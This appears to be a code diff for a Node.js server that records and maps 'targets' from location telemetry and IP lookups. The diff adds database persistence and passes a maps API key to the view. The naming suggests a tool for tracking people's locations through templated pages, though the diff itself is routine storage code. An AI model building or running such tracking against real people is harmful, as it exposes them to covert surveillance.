@@ -10,7 +10,13 @@ const {
     shouldReplaceCurrent
 } = require("./location-quality")
 
+const db = require("./db")
 const TARGETS = new Map()
+global._TARGETS_MAP = TARGETS
+db.loadAllTargets().then(map => {
+    map.forEach((v, k) => TARGETS.set(k, v))
+}).catch(e => console.warn("[DB] Startup load warning:", e.message))
+
 const IP_CACHE = new Map()
 const IP_CACHE_TTL_MS = 15 * 60 * 1000
 const MAX_LOCATION_HISTORY = 100
@@ -193,6 +199,8 @@ function updateTargetTelemetry(id, payload, serverIpLocation, receivedAt = Date.
     if (payload.template) target.template = safeText(payload.template, 40) || target.template
     target.lastSeen = receivedAt
 
+    db.persistTarget(target)
+
     if (global.IO) {
         if (isNew) global.IO.emit("user-connected", id)
         global.IO.emit("map-data", { id, target, lat: target.lat, lng: target.lng })
@@ -297,14 +305,21 @@ router.use(function checkToken(req, res, next) {
 router.get("/api/targets", (_req, res) => res.json(targetsAsObject()))
 router.get("/api/targets/:id", (req, res) => res.json(TARGETS.get(req.params.id) || null))
 router.delete("/api/targets/:id", (req, res) => {
-    if (TARGETS.delete(req.params.id) && global.IO) global.IO.emit("user-disconnected", req.params.id)
+    const id = req.params.id
+    if (TARGETS.delete(id)) {
+        db.removeTarget(id)
+        if (global.IO) global.IO.emit("user-disconnected", id)
+    }
     res.json({ success: true })
 })
 
 router.get("/", (_req, res) => res.render("home", { TARGETS: targetsAsObject() }))
 router.get("/map", (req, res) => {
     const target = TARGETS.get(req.query.id)
-    res.render("map", { data: JSON.stringify(target ? [target.lat, target.lng] : [null, null]) })
+    res.render("map", {
+        data: JSON.stringify(target ? [target.lat, target.lng] : [null, null]),
+        googleMapsApiKey: config.googleMapsApiKey || ""
+    })
 })
 
 module.exports = router
